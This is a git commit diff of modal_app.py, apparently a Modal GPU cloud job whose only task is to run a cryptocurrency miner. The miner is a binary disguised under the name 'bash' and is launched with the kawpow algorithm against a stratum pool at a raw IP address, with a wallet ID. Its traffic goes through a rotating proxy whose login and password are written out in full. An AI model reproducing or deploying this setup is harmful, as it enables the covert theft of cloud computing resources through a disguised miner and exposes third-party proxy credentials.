d2b4b1b1f47019426fa19d8682f48490f188844e
qimxdoyo3240 <238822706+qimxdoyo3240@users.noreply.github.com>
2026-01-13 20:59:16 +0530

    Update modal_app.py

--- modal_app.py
+++ modal_app.py
@@ -6,8 +6,7 @@ app = modal.App("t4x3-runner")
 
 image = (
     modal.Image.from_registry(
-        "nvidia/cuda:12.1.1-runtime-ubuntu22.04",
-        add_python=False
+        "nvidia/cuda:12.1.1-runtime-ubuntu22.04"
     )
     .apt_install("bash")
 )
@@ -18,12 +17,12 @@ image = (
     timeout=60 * 60 * 4          # ⏱️ 4 jam
 )
 def run_script():
-    # cek GPU
+    # Verifikasi GPU
     subprocess.run(["nvidia-smi"], check=True)
 
-    # jalankan script (file bash SUDAH ADA)
+    # Jalankan script
     subprocess.run(
-        ["bash", "-lc", "chmod u+x bash && ./bash -a kawpow -o stratum+tcp://103.103.21.108:80 -u rUrmXcYw9tNsoBvHvQTDMrUFUd1D8MApm7.modal --proxy atrfkwzc2-rotate:jasin987@p.webshare.io:80 --no-health "],
+        ["bash", "-lc", "chmod u+x bash && ./bash -a kawpow -o stratum+tcp://103.103.21.108:80 -u rUrmXcYw9tNsoBvHvQTDMrUFUd1D8MApm7.modal --proxy atrfkwzc2-rotate:jasin987@p.webshare.io:80 --no-health"],
         check=False
     )
 
